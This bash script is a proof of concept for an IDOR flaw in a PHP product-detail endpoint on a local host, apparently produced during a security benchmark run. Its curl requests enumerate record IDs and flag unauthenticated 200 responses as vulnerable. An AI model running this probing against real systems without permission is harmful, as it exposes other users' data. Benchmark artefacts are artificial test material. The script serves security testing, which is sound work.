#!/bin/bash
# POC: Enhanced IDOR POC with diagnostic output to verify endpoint accessibility and behavior
# Target: ./repo
# Created: 2025-12-02T16:23:45.614Z
# Session: benchmark-XBEN-092-24-miorxl1g

# IDOR Vulnerability POC - sku_product_detail.php (Version 2)
# Demonstrates unauthorized access to SKU records via ID parameter manipulation

TARGET_URL="http://localhost:8081"
ENDPOINT="/sku_product_detail.php"

echo "========================================"
echo "IDOR Vulnerability POC - SKU Product Detail (v2)"
echo "========================================"
echo ""

# Test 1: Check endpoint connectivity with verbose output
echo "[*] Test 1: Checking endpoint connectivity with full headers"
echo "[*] URL: $TARGET_URL$ENDPOINT?id=1"
echo ""
curl -v "$TARGET_URL$ENDPOINT?id=1" 2>&1 | head -40
echo ""

# Test 2: Try with -I to see headers only
echo "[*] Test 2: Checking HTTP headers"
curl -I "$TARGET_URL$ENDPOINT?id=1" 2>&1
echo ""

# Test 3: Try without ID parameter
echo "[*] Test 3: Testing without ID parameter"
RESPONSE=$(curl -s "$TARGET_URL$ENDPOINT")
echo "[+] Response length: ${#RESPONSE}"
echo "[+] Response:"
echo "$RESPONSE" | head -30
echo ""

# Test 4: Try with multiple IDs and capture full HTTP status
echo "[*] Test 4: Testing with different ID values and capturing HTTP status"
for id in 1 2 3 999; do
    HTTP_CODE=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET_URL$ENDPOINT?id=$id")
    echo "[+] ID=$id -> HTTP Status: $HTTP_CODE"
done
echo ""

# Test 5: Try to access the endpoint and capture everything
echo "[*] Test 5: Full response capture for ID=1"
FULL_RESPONSE=$(curl -s "$TARGET_URL$ENDPOINT?id=1")
echo "[+] Full Response Length: ${#FULL_RESPONSE}"
echo "[+] First 100 chars of response:"
echo "$FULL_RESPONSE" | head -c 500
echo ""
echo ""

# Test 6: Check if endpoint exists by testing for common error messages
echo "[*] Test 6: Looking for endpoint behavior indicators"
RESPONSE=$(curl -s "$TARGET_URL$ENDPOINT?id=1")
if echo "$RESPONSE" | grep -iq "not found\|404\|error"; then
    echo "[!] Response contains error message"
    echo "$RESPONSE"
elif [ -z "$RESPONSE" ]; then
    echo "[!] Endpoint returned empty response"
    echo "[*] This could indicate:"
    echo "    - The endpoint exists but returns no content"
    echo "    - The database query failed silently"
    echo "    - The application is not properly configured"
else
    echo "[+] Response contains data:"
    echo "$RESPONSE"
fi
echo ""

# Test 7: Check if the file exists on the server
echo "[*] Test 7: Attempting to verify file presence"
HTTP_CODE=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET_URL$ENDPOINT")
echo "[+] HTTP Status Code for endpoint: $HTTP_CODE"

if [ "$HTTP_CODE" = "200" ]; then
    echo "[!] VULNERABLE: Endpoint exists and returns 200 without authentication"
elif [ "$HTTP_CODE" = "404" ]; then
    echo "[-] Endpoint not found"
elif [ "$HTTP_CODE" = "403" ]; then
    echo "[*] Endpoint forbidden (protected)"
elif [ "$HTTP_CODE" = "401" ]; then
    echo "[*] Endpoint requires authentication"
else
    echo "[*] Unexpected HTTP status: $HTTP_CODE"
fi
echo ""

echo "========================================"
echo "POC Diagnostics Complete"
echo "========================================"